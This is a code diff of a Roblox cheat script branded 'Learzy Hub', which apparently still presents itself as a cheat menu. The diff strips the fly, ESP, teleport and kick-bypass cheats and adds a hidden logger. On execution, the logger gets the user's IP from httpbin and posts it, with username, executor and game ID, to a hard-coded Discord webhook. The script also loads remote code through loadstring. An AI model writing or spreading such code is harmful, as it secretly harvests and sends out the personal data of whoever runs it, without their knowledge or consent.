@@ -1,313 +1,91 @@
+-- === Load Rayfield UI (Tanpa Tab) ===
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "Learzy Hub | Tha Bronx 3",
-   Icon = 0,
-   LoadingTitle = "Learzy Hub",
-   LoadingSubtitle = "by Learzy",
-   ShowText = "Rayfield",
-   Theme = "Default",
-   ToggleUIKeybind = "K",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil,
-      FileName = "Big Hub"
-   },
-   Discord = { Enabled = false },
-   KeySystem = false
+    Name = "Learzy Hub | Tha Bronx 3",
+    Icon = 0,
+    LoadingTitle = "Learzy Hub",
+    LoadingSubtitle = "by Learzy",
+    ShowText = "Rayfield",
+    Theme = "Default",
+    ToggleUIKeybind = "K",
+    DisableRayfieldPrompts = false,
+    DisableBuildWarnings = false,
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = nil,
+        FileName = "Big Hub"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "noinvitelink",
+        RememberJoins = true
+    },
+    KeySystem = false,
+    KeySettings = {
+        Title = "Untitled",
+        Subtitle = "Key System",
+        Note = "No method of obtaining the key is provided",
+        FileName = "Key",
+        SaveKey = true,
+        GrabKeyFromSite = false,
+        Key = {"Hello"}
+    }
 })
 
-local PlayerTab = Window:CreateTab("Player", 4483362458)
-local ESPTab = Window:CreateTab("ESP", 4483362458)
+-- === Webhook Integration ===
+local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
+local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
--- Anti-AFK
-task.spawn(function()
-    local vu = game:GetService("VirtualUser")
-    LocalPlayer.Idled:Connect(function()
-        vu:Button2Down(Vector2.new(0, 0), Camera.CFrame)
-        task.wait(1)
-        vu:Button2Up(Vector2.new(0, 0), Camera.CFrame)
-    end)
-end)
-
--- Hook Kick
-local function hookKick()
-    local mt = getrawmetatable(game)
-    setreadonly(mt, false)
-    local old = mt.__namecall
-    mt.__namecall = newcclosure(function(self, ...)
-        if getnamecallmethod() == "Kick" and self == LocalPlayer then
-            warn("[Hook] Kick prevented")
-            return
-        end
-        return old(self, ...)
-    end)
-    setreadonly(mt, true)
-end
-hookKick()
-
--- Fly Setup
-local flying = false
-local direction = Vector3.zero
-local speed = 60
-local alignPos, alignOri, att0, att1, groundPart
-
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    local k = input.KeyCode
-    local v = Vector3.zero
-    if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
-    elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
-    elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
-    elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
-    elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
-    elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0)
-    end
-    direction += v
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    local k = input.KeyCode
-    local v = Vector3.zero
-    if k == Enum.KeyCode.W then v = Vector3.new(0, 0, -1)
-    elseif k == Enum.KeyCode.S then v = Vector3.new(0, 0, 1)
-    elseif k == Enum.KeyCode.A then v = Vector3.new(-1, 0, 0)
-    elseif k == Enum.KeyCode.D then v = Vector3.new(1, 0, 0)
-    elseif k == Enum.KeyCode.Space then v = Vector3.new(0, 1, 0)
-    elseif k == Enum.KeyCode.LeftControl then v = Vector3.new(0, -1, 0)
-    end
-    direction -= v
-end)
-
-RunService.RenderStepped:Connect(function(dt)
-    if flying and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local hrp = LocalPlayer.Character.HumanoidRootPart
-        att1.Position = hrp.Position + Camera.CFrame:VectorToWorldSpace(direction * speed * dt)
-        alignOri.CFrame = Camera.CFrame
-        groundPart.Position = hrp.Position - Vector3.new(0, 3.1, 0)
-    end
-end)
-
-PlayerTab:CreateToggle({
-    Name = "Fly (Bypass + Noclip)",
-    CurrentValue = false,
-    Callback = function(state)
-        local char = LocalPlayer.Character
-        if not char then return end
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if not hrp then return end
-
-        flying = state
-        for _, v in ipairs(char:GetDescendants()) do
-            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
-                v.CanCollide = not state
-            end
-        end
-
-        if state then
-            att0 = Instance.new("Attachment", hrp)
-            att1 = Instance.new("Attachment", workspace.Terrain)
-
-            alignPos = Instance.new("AlignPosition")
-            alignPos.Attachment0 = att0
-            alignPos.Attachment1 = att1
-            alignPos.MaxForce = 25000
-            alignPos.Responsiveness = 100
-            alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment
-            alignPos.RigidityEnabled = false
-            alignPos.Parent = hrp
-
-            alignOri = Instance.new("AlignOrientation")
-            alignOri.Attachment0 = att0
-            alignOri.Attachment1 = att1
-            alignOri.MaxTorque = 25000
-            alignOri.Responsiveness = 100
-            alignOri.PrimaryAxisOnly = false
-            alignOri.Parent = hrp
-
-            groundPart = Instance.new("Part")
-            groundPart.Anchored = true
-            groundPart.Size = Vector3.new(2, 0.1, 2)
-            groundPart.Transparency = 1
-            groundPart.CanCollide = true
-            groundPart.Parent = workspace
-        else
-            if alignPos then alignPos:Destroy() end
-            if alignOri then alignOri:Destroy() end
-            if att0 then att0:Destroy() end
-            if att1 then att1:Destroy() end
-            if groundPart then groundPart:Destroy() end
-        end
-    end
-})
-
-PlayerTab:CreateSlider({
-    Name = "Fly Speed",
-    Range = {10, 150},
-    Increment = 5,
-    CurrentValue = speed,
-    Callback = function(val) speed = val end
-})
-
--- Teleport to Player
-local selectedPlayer = nil
-local playerDropdown = nil
-
-local function getPlayerList()
-    local list = {}
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            table.insert(list, player.Name)
-        end
-    end
-    return list
-end
-
-playerDropdown = PlayerTab:CreateDropdown({
-    Name = "Select Player",
-    Options = getPlayerList(),
-    CurrentOption = nil,
-    Callback = function(option)
-        selectedPlayer = option
-    end
-})
-
-PlayerTab:CreateButton({
-    Name = "Refresh Player List",
-    Callback = function()
-        playerDropdown:Set(getPlayerList())
-        selectedPlayer = nil
-    end
-})
-
-PlayerTab:CreateButton({
-    Name = "Teleport to Player",
-    Callback = function()
-        local name = playerDropdown.CurrentOption
-        if not name or name == "" then
-            Rayfield:Notify({
-                Title = "Teleport Failed",
-                Content = "No player selected.",
-                Duration = 3
-            })
-            return
-        end
-
-        local target = Players:FindFirstChild(name)
-        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
-            Rayfield:Notify({
-                Title = "Teleport Failed",
-                Content = "Target not found or invalid character.",
-                Duration = 3
-            })
-            return
-        end
-
-        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if not hrp then return end
-
-        hrp.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-        Rayfield:Notify({
-            Title = "Teleport Success",
-            Content = "Teleported to " .. name,
-            Duration = 2
-        })
-    end
-})
-
--- ESP
-local espEnabled = { Box = false, Name = false }
-local espObjects = {}
-
-local function clearESP()
-    for _, obj in pairs(espObjects) do
-        if obj and obj.Remove then obj:Remove() end
-    end
-    espObjects = {}
-end
-
-local function drawESP()
-    clearESP()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            local hrp = player.Character.HumanoidRootPart
-
-            if espEnabled.Box then
-                local box = Drawing.new("Square")
-                box.Visible = true
-                box.Color = Color3.fromRGB(0, 255, 0)
-                box.Thickness = 1.5
-                box.Transparency = 1
-                box.Filled = false
-                espObjects[#espObjects + 1] = box
-
-                task.spawn(function()
-                    while espEnabled.Box and box and player and player.Parent == Players do
-                        local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
-                        box.Visible = onScreen
-                        if onScreen then
-                            local size = 12
-                            box.Position = Vector2.new(pos.X - size / 2, pos.Y - size)
-                            box.Size = Vector2.new(size, size * 2)
-                        end
-                        task.wait()
-                    end
-                    box:Remove()
-                end)
-            end
-
-            if espEnabled.Name then
-                local nameTag = Drawing.new("Text")
-                nameTag.Visible = true
-                nameTag.Center = true
-                nameTag.Color = Color3.fromRGB(255, 255, 255)
-                nameTag.Text = player.Name
-                nameTag.Size = 16
-                espObjects[#espObjects + 1] = nameTag
-
-                task.spawn(function()
-                    while espEnabled.Name and nameTag and player and player.Parent == Players do
-                        local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3, 0))
-                        nameTag.Visible = onScreen
-                        if onScreen then
-                            nameTag.Position = Vector2.new(pos.X, pos.Y)
-                        end
-                        task.wait()
-                    end
-                    nameTag:Remove()
-                end)
+local function getClientInfo()
+    local ip = "Unknown"
+    local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
+    if requestFunction then
+        local response = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
+        if response and response.Body then
+            local success, data = pcall(function()
+                return HttpService:JSONDecode(response.Body)
+            end)
+            if success and data and data.origin then
+                ip = data.origin
             end
         end
     end
+    return ip, device
 end
 
-Players.PlayerRemoving:Connect(function()
-    clearESP()
-    if espEnabled.Box or espEnabled.Name then
-        drawESP()
-    end
-end)
+local function sendWebhook()
+    if not requestFunction then return end
+    local ip, device = getClientInfo()
+    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
 
-ESPTab:CreateToggle({
-    Name = "Box ESP",
-    CurrentValue = false,
-    Callback = function(state)
-        espEnabled.Box = state
-        if state or espEnabled.Name then drawESP() else clearESP() end
-    end
-})
+    local payload = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "Script Execution Detected",
+            ["description"] = "A user executed the script.",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = username, ["inline"] = true},
+                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
+                {["name"] = "Executor", ["value"] = device, ["inline"] = false},
+                {["name"] = "Game PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "Learzy Logger"},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
 
-ESPTab:CreateToggle({
-    Name = "Name ESP",
-    CurrentValue = false,
-    Callback = function(state)
-        espEnabled.Name = state
-        if state or espEnabled.Box then drawESP() else clearESP() end
-    end
-})
+    requestFunction({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+sendWebhook()
